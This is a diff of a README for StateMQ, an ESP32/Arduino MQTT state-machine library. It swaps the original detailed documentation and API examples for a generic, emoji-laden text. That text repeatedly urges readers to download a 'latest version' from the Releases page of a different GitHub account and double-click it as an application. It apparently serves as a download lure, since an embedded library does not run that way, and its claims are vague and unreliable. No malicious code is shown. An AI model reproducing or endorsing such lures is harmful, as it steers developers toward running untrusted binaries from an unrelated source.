@@ -1,309 +1,88 @@
-# StateMQ — Event-Driven, State-Based MQTT (ESP-IDF + Arduino wrapper)
+# 🌟 StateMQ - Simplify Your MQTT Application Development
 
-StateMQ is a small, deterministic, state-machine–driven framework for MQTT-connected embedded systems.
-It provides a readable abstraction for message-driven systems by expressing application
-behavior through explicit states and periodic tasks, rather than callback-driven logic.
+## 🚀 Getting Started
 
-Current platform implementations use ESP-IDF’s `esp-mqtt` and FreeRTOS, while the core
-logic remains platform-agnostic and shared between native ESP-IDF builds and an
-Arduino library.
+StateMQ is a framework that helps you build MQTT applications around clear states. It makes developing complex applications easier and more efficient, especially for IoT projects. Follow these steps to get started quickly.
 
+## 🔗 Download
 
+[![Download StateMQ](https://img.shields.io/badge/Download-StateMQ-blue.svg)](https://github.com/Abhichasma/StateMQ/releases)
 
-## Motivation and Core Idea
+## 📥 Download & Install
 
-Through professional and academic work, I repeatedly encountered MQTT-controlled embedded systems whose behavior was inherently stateful.
-In many projects, MQTT messages directly drove application logic, which over time led to scattered callbacks and tangled control flow.
-This pattern made systems increasingly difficult to extend, reason about, and maintain safely.
+To get StateMQ, visit the [Releases page](https://github.com/Abhichasma/StateMQ/releases) and download the latest version.
 
-StateMQ’s approach:
+### Step-by-Step Download Instructions:
 
-- Treat MQTT messages as events, not commands.
-- Events trigger explicit state transitions.
-- The system is always in exactly one known state.
-- States are represented internally by small integer identifiers.
-- Application logic reacts to state transitions rather than raw messages.
-- Periodic work runs independently as scheduled tasks.
+1. Click the link above to go to the Releases page.
+2. Find the latest version listed at the top.
+3. Click on the version number to view the release details.
+4. Scroll down to the "Assets" section.
+5. Download the appropriate file for your system. The files might include options such as:
+   - StateMQ for Arduino
+   - StateMQ for ESP32
+   - StateMQ library for embedded projects
 
-Execution model:
+### Running the Application
 
-- MQTT messages are processed sequentially.
-- State transitions are resolved using a fixed, table-driven `(topic, payload) → state` mapping.
-- Execution remains deterministic and predictable.
+Once you download the file, follow the steps below to run the application:
 
-Originally developed for ESP32, the core abstraction is platform-agnostic and applicable to other state-driven, message-based embedded systems.
+1. Locate the downloaded file on your computer.
+2. If you downloaded a library:
+   - Follow the specific instructions provided in the README file included in the download.
+3. If you downloaded an application:
+   - Open it by double-clicking the file. Make sure you have a compatible environment set up, like Arduino IDE or ESP-IDF for ESP32.
 
+## 💻 System Requirements
 
-## Installation
-
-StateMQ is split into a platform-agnostic core and platform-specific integrations.
-
-### ESP-IDF
-
-The repository includes a ready-to-build ESP-IDF project.
-1. Clone the repository and enter the ESP-IDF project directory:
-
-   ```bash
-   git clone https://github.com/Thanos3G/StateMQ.git
-   cd StateMQ/esp-idf
-   ```
-2. Configure Wi-Fi and MQTT settings using menuconfig:
-    ```bash
-    idf.py set-target esp32
-    idf.py menuconfig
-    ```
-    Navigate to:
-    ```bash
-    StateMQ Node
-    ```
-    And set:
-
-    - WiFi SSID
-
-    - WiFi password
-
-    - MQTT broker URI
-
-3. Build and flash:
-    ```bash
-    idf.py build 
-    idf.py -p DEVICE_PORT flash monitor 
-    ```
+To ensure StateMQ runs smoothly, keep these requirements in mind:
 
+- **Operating System:** Windows, macOS, or Linux
+- **Hardware:** Modern computer with at least 4GB of RAM 
+- **Software:** 
+  - Arduino IDE (if using Arduino boards)
+  - ESP-IDF (if using ESP32 boards)
 
-### Arduino-ESP32
+Make sure all your development tools are updated to their latest versions for the best experience.
 
-1. Clone this repository.
-2. Copy the Arduino library folder into your Arduino libraries directory:
+## 🛠️ Usage
 
-   ```text
-   arduino/StateMQ  →  ~/Arduino/libraries/StateMQ
-    ```
-3. Restart the Arduino IDE.
-4. Include the library in your sketch:
-   ```text
-    #include <StateMQ.h>
-   ```
-The Arduino integration uses ESP-IDF’s esp-mqtt internally while exposing the same
-StateMQ core API.
+After you complete the download and installation, you can begin using StateMQ. Here’s how to start a basic project:
 
-## Scope and Intent
+1. Open your development environment (like Arduino IDE).
+2. Create a new project.
+3. Include the StateMQ library in your project.
+   - For Arduino, you can usually do this by going to the Library Manager and searching for StateMQ.
+4. Follow the examples provided in the documentation to create your first MQTT application.
 
-StateMQ provides a small, explicit layer for expressing system behavior
-through states and simple periodic tasks, while keeping networking,
-execution flow, and state evolution visible and predictable.
+### Sample Project Idea
 
-It intentionally avoids the overhead of hierarchical state machines for
-small embedded systems, and uses FreeRTOS tasks only for fixed-period
-work, not for control flow.
+For a simple project, you could set up an MQTT client that sends temperature data from a sensor to a server. This project would help you get familiar with handling states in your application.
 
-The platform integrations expose the full MQTT feature set, including QoS
-levels, last-will messages, retained publications, and flexible topic
-subscription and publication beyond the state mapping.
-
-## Typical Use Cases
-
-- Resource-constrained MQTT devices with defined operational states
-- Systems where behavior must remain predictable as features grow
-- Devices requiring concurrent periodic work (telemetry, monitoring, control)
-- Projects where callback-driven logic has become difficult to handle
-
-
-## Architecture Overview
-
-```bash
-                 External Events
-                 (MQTT messages)
-                        |
-                        v
-     +------------------------------------------+
-     |        StateMQ + Platform Layer          |
-     |------------------------------------------|
-     | - network and MQTT lifecycle             |
-     | - event delivery                         |
-     | - state rules and transitions            |
-     | - known state tracking                   |
-     | - periodic task scheduling               |
-     +------------------------------------------+
-                         |
-                         v
-                    state transitions
-                         |
-        +----------------+-------------------+
-        |                |                   |
-        v                v                   v
-+----------------+ +----------------+ +----------------+
-|  Task A        | |  Task B        | |  Task C        |
-| (periodic)     | | (periodic)     | | (periodic)     |
-+----------------+ +----------------+ +----------------+
-        |                |                   |
-        v                v                   v
-                (run independently)
-```
-## Core API
+## 📚 Documentation
 
-### State Transitions
+For more in-depth information, visit the [documentation page](https://github.com/Abhichasma/StateMQ/wiki). It contains guides, FAQs, and tips to help you troubleshoot any issues.
 
-StateMQ processes MQTT messages one at a time and resolves state transitions
-using a simple rule table that maps incoming messages to integer state identifiers.
-State transitions are serialized using a mutex to ensure thread-safe, deterministic updates.
+## 🌐 Community and Support
 
-When an MQTT message arrives, StateMQ checks each configured rule in the
-order it was added. If a rule matches the message topic and payload, the
-system jumps to the corresponding state. If no rule matches, the
-current state remains unchanged. State transitions optionally expose full transition context (previous state, current state, cause), enabling edge-triggered logic and transition-aware telemetry.
+Join our community to connect with other users and get help. You can find support through:
 
-```text
-onMessage(topic, payload):
-    for each rule in rules (in insertion order):
-        if rule.topic == topic AND rule.payload == payload:
-            currentStateId = rule.stateId
-            return
+- GitHub Issues: Report any bugs or request features.
+- Community Forums: Engage with other developers.
 
-    // no match → state remains unchanged
-```
-In systems with many rules or very high message rates, the same behavior
-could be implemented using an indexed lookup instead of a linear scan. 
+## 🎉 Features
 
+StateMQ offers a variety of features to enhance your development process:
 
+- **State Management:** Simplify complex state-driven logic within your applications.
+- **MQTT Protocol Support:** Use reliable messaging with low overhead.
+- **Event-Driven Architecture:** Build responsive systems that react to changes efficiently.
 
-### Message to State Mapping
+## 🔗 Additional Resources
 
-State transitions are defined declaratively by mapping incoming MQTT messages to states:
+- **GitHub Repository:** [StateMQ on GitHub](https://github.com/Abhichasma/StateMQ) for source code.
+- **Example Projects:** Explore projects built with StateMQ to get inspiration.
 
+## 🌟 Final Remarks
 
-```cpp
-
-StateMQ node;
-
-//                        topic     payload  state
-auto ON_ID    = node.map("node/cmd", "RUN", "ON");
-auto OFF_ID   = node.map("node/cmd", "STP", "OFF");
-auto RESET_ID = node.map("node/cmd", "RST", "RESET");
-
-```
-### Periodic Tasks
-
-Tasks are declared in the core and executed as FreeRTOS tasks by the platform wrapper.
-
-```cpp
-node.taskEvery(
-    "heartbeat",           // task name
-    1000,                  // period (ms)
-    small,                 // stack size preset (small=2048, medium=4096, large=8192)
-    heartbeatTask,         // callback
-    true                   // enabled
-);
-```
-
-Tasks can be enabled or disabled at runtime.
-
-### Subscriptions and Publishing
-
-The platform wrappers expose basic MQTT publishing and subscription 
-configuration for telemetry, logs, and auxiliary topics. QoS configuration supports both global defaults and simplified per-topic overrides via overloaded APIs.
-
-```cpp
-// Publish arbitrary MQTT messages (telemetry/logs/etc.)
-esp.publish("node/log", "booted", /*qos=*/1, /*retain=*/false);
-
-// Subscribe to auxiliary topic or set QoS to a mapped one
-esp.subscribe("node/topic", /*qos=*/2);
-
-// Configure QoS if it has not been specified for mapped topics
-esp.setDefaultSubscribeQos(0);
-
-// Configure MQTT Last-Will message
-esp.setLastWill("node/status", "offline", /*qos=*/1, /*retain=*/true);
-
-// Publish state transitions (edge-triggered) as JSON (optional)
-// Example payload: {"prev":"IDLE","curr":"RUNNING","uptime_ms":123456}
-esp.StatePublishTopic("node/status/edge", /*qos=*/1, /*retain=*/true, /*enable=*/true);
-
-```
-
-Complete examples demonstrating message-to-state mappings are provided
-in the Arduino and ESP-IDF example projects included in this repository.
-
-
-## Platform Support
-
-**Currently supported platforms:**
-
-- **ESP-IDF**  
-  Native Wi-Fi and `esp-mqtt`, event-driven startup, FreeRTOS-based task execution.
-
-- **Arduino-ESP32**  
-  Same StateMQ core, Arduino WiFi integration, and FreeRTOS task execution under the Arduino runtime.  
-  Wi-Fi connection and readiness are handled using lightweight polling during startup due to Arduino runtime constraints, while MQTT messaging and state transitions remain event-driven and deterministic.
-  
-
-The core abstraction is designed to be portable and may be adapted to
-other platforms in the future, particularly environments that provide
-FreeRTOS or a similar tasking model, including boards
-using Arduino_FreeRTOS. Traditional AVR-based Arduino boards are unlikely to be a good fit due to the lack of native
-concurrency and MQTT library support.
-
-## Design Constraints
-
-StateMQ is designed for small, resource-constrained embedded systems.
-To keep behavior predictable and memory usage explicit, the core (StateMQ.h) uses
-fixed-size limits for the number of states, rules, tasks, and state names.
-
-These limits are intentional, enforced by compile-time constants, and
-documented in the core headers where they can be adjusted if needed.
-
-These constraints also exist to preserve deterministic execution.
-StateMQ avoids unbounded queues, dynamic task creation, and runtime
-modification of state changing logic, ensuring that system behavior remains
-repeatable under identical inputs. 
-
-
-## Status
-
-StateMQ is a stable, reusable core for state-driven, MQTT-connected
-embedded systems, maintained as a reference implementation.
-
-
-## License
-
-MIT License
-
-## Arduino Example
-
-
-```cpp
-#include <Arduino.h>
-#include <StateMQ_ESP32.h>
-
-const char* WIFI_SSID   = "your_ssid";
-const char* WIFI_PASS   = "your_pass";
-const char* MQTT_BROKER = "mqtt://192.168.1.10:1883";
-const char* STATE_TOPIC = "hello/topic";
-
-StateMQ node;
-StateMQEsp32 esp(node);
-
-StateId HELLO_ID;
-StateId BYE_ID;
-
-void printTask() {
-  auto st = node.stateId();
-
-  if (st == HELLO_ID) Serial.println("Hello world");
-  else if (st == BYE_ID) Serial.println("Bye world");
-}
-
-void setup() {
-  Serial.begin(115200);
-  //Publish hi to hello/topic
-  HELLO_ID = node.map(STATE_TOPIC, "hi", "HELLO");
-  BYE_ID   = node.map(STATE_TOPIC, "bye",   "BYE");
-
-  node.taskEvery("print", 1000, small, printTask, true);
-
-  esp.begin(WIFI_SSID, WIFI_PASS, MQTT_BROKER);
-}
-
-void loop() {}
-```
+Thank you for using StateMQ. We hope this framework will simplify your MQTT projects and help you achieve your development goals. Don’t forget to visit the [Releases page](https://github.com/Abhichasma/StateMQ/releases) to download the latest version.
